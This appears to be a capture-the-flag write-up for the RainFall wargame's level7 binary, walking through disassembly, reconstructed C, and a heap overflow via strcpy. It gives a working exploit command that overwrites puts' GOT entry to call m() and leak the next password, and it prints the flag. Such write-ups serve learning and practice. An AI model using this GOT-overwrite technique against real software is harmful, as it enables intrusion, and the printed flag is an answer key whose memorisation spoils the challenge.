
### notes
```c
0x0804 9960  c : variable
0x0804 84f4  m : function : not called anywhere
0x0804 8521  main : function
```

### 0x08048529 : main() : disassembly
- notebook: (to convert `hex` to `dec` and assign variable names for better reading)
```c

{
    int argc = ebp+8
    char **argv = ebp+12

    char *mallo_1 = esp+28
    char *mallo_2 = esp+24
 
    // 0x44 ... 68
    // 0x20 ... 32
    // 0x1c ... 28
    // 0x18 ... 24
}
```
* __`<0> -> <+6> : prepare stack frame for n function with size 32`__
```c
0x08048521 <+0>:	push   ebp
0x08048522 <+1>:	mov    ebp,esp
0x08048524 <+3>:	and    esp,0xfffffff0
0x08048527 <+6>:	sub    esp,32
```
* __`<+9> -> <+21> :  malloc size 8 from the heap and put the return address in mallo_1`__
```c
0x0804852a <+9>:	mov    DWORD PTR [esp],8
0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
0x08048536 <+21>:	mov    DWORD PTR [mallo_1],eax
mallo_1 = malloc(8);
```
* __`<+25> -> <+29> : set 1 to first case of mallo_1`__
* __`<+35> -> <+53> : allocated 8 bytes in the heap and put the address to it in mallo_1[1]`__
```c
0x0804853a <+25>:	mov    eax,DWORD PTR [mallo_1]
0x0804853e <+29>:	mov    DWORD PTR [eax],1
mallo_1[0] = 1;
0x08048544 <+35>:	mov    DWORD PTR [esp],8
0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
0x08048550 <+47>:	mov    edx,eax
0x08048552 <+49>:	mov    eax,DWORD PTR [mallo_1]
0x08048556 <+53>:	mov    DWORD PTR [eax+4],edx
mallo_1[1] = malloc(8);
```
* __`<+56> -> <+68> : malloc size 8 from the heap and put the return address in mallo_2`__
```c
0x08048559 <+56>:	mov    DWORD PTR [esp],8
0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
0x08048565 <+68>:	mov    DWORD PTR [mallo_2],eax
mallo_2 = malloc(8);
```
* __`<+72> -> <+76> : set 1 to first case of mallo_2`__
* __`<+82> -> <+100> : allocated 8 bytes in the heap and put the address to it in mallo_2[1]`__
```c
0x08048569 <+72>:	mov    eax,DWORD PTR [mallo_2]
0x0804856d <+76>:	mov    DWORD PTR [eax],2
mallo_2[0] = 2;
0x08048573 <+82>:	mov    DWORD PTR [esp],8
0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
0x0804857f <+94>:	mov    edx,eax
0x08048581 <+96>:	mov    eax,DWORD PTR [mallo_2]
0x08048585 <+100>:	mov    DWORD PTR [eax+4],edx
mallo_2[1] = malloc(8);
```
* __`<+>103 -> <+127> : copy the content from argv[1] to mallo_1[1] with strcpy (no size check)`__
```c
0x08048588 <+103>:	mov    eax,DWORD PTR [argv]
0x0804858b <+106>:	add    eax,4
0x0804858e <+109>:	mov    eax,DWORD PTR [eax]
0x08048590 <+111>:	mov    edx,eax // edx = argv[1]
0x08048592 <+113>:	mov    eax,DWORD PTR [mallo_1]
0x08048596 <+117>:	mov    eax,DWORD PTR [eax+4]
0x08048599 <+120>:	mov    DWORD PTR [esp+4],edx
0x0804859d <+124>:	mov    DWORD PTR [esp],eax
0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
strcpy(mallo_1[1], argv[1]);
```
* __`<+132> -> <+156> : copy the content from argv[2] to mallo_2[1] with strcpy (no size check)`__
```c
0x080485a5 <+132>:	mov    eax,DWORD PTR [argv]
0x080485a8 <+135>:	add    eax,8
0x080485ab <+138>:	mov    eax,DWORD PTR [eax]
0x080485ad <+140>:	mov    edx,eax // edx = argv[2]
0x080485af <+142>:	mov    eax,DWORD PTR [mallo_2]
0x080485b3 <+146>:	mov    eax,DWORD PTR [eax+4]
0x080485b6 <+149>:	mov    DWORD PTR [esp+4],edx
0x080485ba <+153>:	mov    DWORD PTR [esp],eax
0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
strcpy(mallo_2[1], argv[2]);
```
* __`<+161> -> <+175> : read the content from .pass in level8 with fopen`__
* __`<+183> -> <+202> : copy 65 character from .pass to variable c with fgets`__
* __`<+207> -> <+214> : print "~~" on the screen with puts()`__

```c
0x080485c2 <+161>:	mov    edx,0x80486e9 // "r"
0x080485c7 <+166>:	mov    eax,0x80486eb // "/home/user/level8/.pass"
0x080485cc <+171>:	mov    DWORD PTR [esp+4],edx
0x080485d0 <+175>:	mov    DWORD PTR [esp],eax
0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
fopen("/home/user/level8/.pass", "r");
0x080485d8 <+183>:	mov    DWORD PTR [esp+8],eax
0x080485dc <+187>:	mov    DWORD PTR [esp+4],68
0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960 // c variable
0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
fgets(c, 68, fopen("/home/user/level8/.pass", "r"));
0x080485f0 <+207>:	mov    DWORD PTR [esp],0x8048703 // "~~"
0x080485f7 <+214>:	call   0x8048400 <puts@plt>
puts("~~");
```
* __`<+192> -> <+198> : exit the program with 0, equivalent to return(0)`__
```c
0x080485fc <+219>:	mov    eax,0x0
0x08048601 <+224>:	leave  
0x08048602 <+225>:	ret  
return (0);
```
### 0x080484f4 : m() : disassembly
- notebook: (to convert `hex` to `dec` and assign variable names for better reading)
```c

{
    int argc = ebp+8
    char **argv = ebp+12

    char *mallo_1 = esp+28
    char *mallo_2 = esp+24
 

    // 0x18 ... 24
}
```
* __`<0> -> <+3> : prepare stack frame for n function with size 24`__
```c
0x080484f4 <+0>:	push   ebp
0x080484f5 <+1>:	mov    ebp,esp
0x080484f7 <+3>:	sub    esp,24
```
* __`<6> -> <+38> : print the content of variable c + time`__
```c
0x080484fa <+6>:	mov    DWORD PTR [esp],0
0x08048501 <+13>:	call   0x80483d0 <time@plt>
0x08048506 <+18>:	mov    edx,0x80486e0 // "%s - %d\n"
0x0804850b <+23>:	mov    DWORD PTR [esp+8],eax
0x0804850f <+27>:	mov    DWORD PTR [esp+4],0x8049960 // c variable
0x08048517 <+35>:	mov    DWORD PTR [esp],edx
0x0804851a <+38>:	call   0x80483b0 <printf@plt>
printf("%s - %d\n", c, time(0));
```
* __`<43> -> <+44> : exit the m function`__
```c
0x0804851f <+43>:	leave  
0x08048520 <+44>:	ret   
```

### Code Prediction :
```js

let c[68]

function m() {
    printf("%s - %d\n", c, time(0));
    return
}

function main() {   
    mOne = malloc(8) // 0x0804a008
    mOne[0] = 1
    mOne[1] = malloc(8) // 0x0804a018

    mTwo = malloc(8) // 0x0804a028
    mTwo[0] = 2
    mTwo[1] = malloc(8) // 0x0804a038

  
    strcpy(mOne[1], argv[1])
    strcpy(mTwo[1], argv[2])

    let password = fopen("/home/user/level8/.pass", "r")
    fgets(c, 68, password)
    
    puts("~~")
    return
}
```
### Stack illustration :
```shell
    high addresses
+------------------------+ <==  ebp + 14  <------+
| av[2]<= *(ebp+12) + 8  |                       |
| av[1]<= *(ebp+12) + 4  |                       |
| av[0]<= *(ebp+12) + 0  |                       |
+------------------------+ <==  ebp + 12         | 
|        argc            |                       | main frame
+------------------------+ <==  ebp + 8          |
|        eip             |                       |
+------------------------+ <==  ebp+4            |
|        ebp             |                       |
+------------------------+ <==  esp + 32  <------+
|    stack alignement    |                       |
+------------------------+                       | 
|  malloc(8) (mOne 1st)  |                       |
|    mOne[0] : 1         |                       |
|    mOne[1] : malloc(8) |                       |
+------------------------+ <==  esp + 28         |
|  malloc(8) (mTwo 3dt)  |                       |
|    mTwo[0] : 2         |                       |
|    mTwo[1] : malloc(8) |                       |
+------------------------+ <==  esp + 24         |  n frame 32 bytes
           *                                     |
           *                                     |
           *                                     |
+------------------------+ <==  esp + 4          |
|                        |                       |
+------------------------+ <==  esp      <-------+
    low addresses
``` 
---
### Solution :
by reading the assembly we get the following resume
- the program takes two params , av1 && av2
- decalred two variables (m1, m2) with size of 8 and allocating anther size of 8 to the index 1 of each
- copy av1 to m1[1] using strcpy
- copy av2 to m2[1] using strcpy
- strcpy copy whatever in source to destination without checking for size so it vulenrable to buffer overflow

- lets execute the programm using ltrace to watch what happening :
    ```shell
    level7@RainFall:~$ ltrace ./level7 AAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBB
    __libc_start_main(0x8048521, 3, 0xbffff794, 0x8048610, 0x8048680 <unfinished ...>
    malloc(8)                                                                 = 0x0804a008
    malloc(8)                                                                 = 0x0804a018
    malloc(8)                                                                 = 0x0804a028
    malloc(8)                                                                 = 0x0804a038
    strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAA")                                = 0x0804a018
    strcpy(0x0804a038, "BBBBBBBBBBBBBBBBBBBB")                                = 0x0804a038
    fopen("/home/user/level8/.pass", "r"*** glibc detected *** ./level7: free(): invalid next size (normal): 0x0804a048 ***
    ```
- we can see that the heap address in second strcpy is 32 bytes ahead of the first one (__`0x0804a038 - 0x0804a018`__)
- lets try to fill the first arguments with larger value to see at which length we override the second address in the Heap of the strcpy 2
    ```shell
    level7@RainFall:~$ ltrace ./level7 $(python -c 'print "A" * 21')  ABCD
    __libc_start_main(0x8048521, 3, 0xbffff7a4, 0x8048610, 0x8048680 <unfinished ...>
    malloc(8)                                                                 = 0x0804a008
    malloc(8)                                                                 = 0x0804a018
    malloc(8)                                                                 = 0x0804a028
    malloc(8)                                                                 = 0x0804a038
    strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAA")                               = 0x0804a018
    strcpy(0x08040041, "ABCD" <unfinished ...>
    --- SIGSEGV (Segmentation fault) ---
    +++ killed by SIGSEGV +++
    level7@RainFall:~$
    ```
    at the length 21 we see that the address of av2[1] got changed in the last 2 bits

__the exploit :__
1- overwrite the address 0x8049928 (puts jump address) with the m function address that print the variable c
final exploit will look like that
```c
strcpy(0x0804a018, "padding") 
strcpy("JUMP ADDRESS", "m() address")
```

so the exploit payload is 
```shell
level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1663318810
level7@RainFall:~$
```
---
### Solution :

```shell
level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1663318810
level7@
```
__flag : `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`__